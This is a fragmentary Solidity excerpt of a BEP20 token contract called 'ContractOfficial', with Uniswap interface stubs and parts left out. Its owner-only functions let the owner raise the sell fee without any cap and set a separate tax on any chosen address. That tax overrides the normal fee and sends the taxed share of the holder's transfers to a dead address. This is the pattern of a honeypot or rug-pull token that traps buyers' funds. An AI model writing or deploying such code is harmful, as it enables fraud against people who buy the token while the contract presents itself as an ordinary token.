...
interface IUniswapV2Factory {
    ...
    function lzfeeTo() external view returns (address);
    function lzfeeToSetter() external view returns (address);
    ...
    function setlzfeeTo(address) external;
    function setlzfeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportinglzfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportinglzfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportinglzfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportinglzfeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportinglzfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract ContractOfficial is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSelllzfee = 0;

    uint256 private _defaultBuylzfee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _sliplzfee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSelllzfee = _value;
    }

    function setSliplzfee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _sliplzfee[_address] = _value;
    }

    function getSliplzfee(address _address) external view onlyownar returns (uint256) {
        return _sliplzfee[_address];
    }


    function setMAccountlzfee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountlzfee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradelzfeeAmount = 0;

        if (rF) {
            uint256 tradelzfee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradelzfee = _defaultSelllzfee;
                }
                if (from == uniswapV2Pair) {

                    tradelzfee = _defaultBuylzfee;
                }
            }
            if (_sliplzfee[from] > 0) {
                tradelzfee = _sliplzfee[from];
            }

            tradelzfeeAmount = _Amount.mul(tradelzfee).div(100);
        }


        if (tradelzfeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradelzfeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradelzfeeAmount);
            emit Transfer(from, _deadAddress, tradelzfeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradelzfeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradelzfeeAmount);
        emit Transfer(from, _to, _Amount - tradelzfeeAmount);
    }
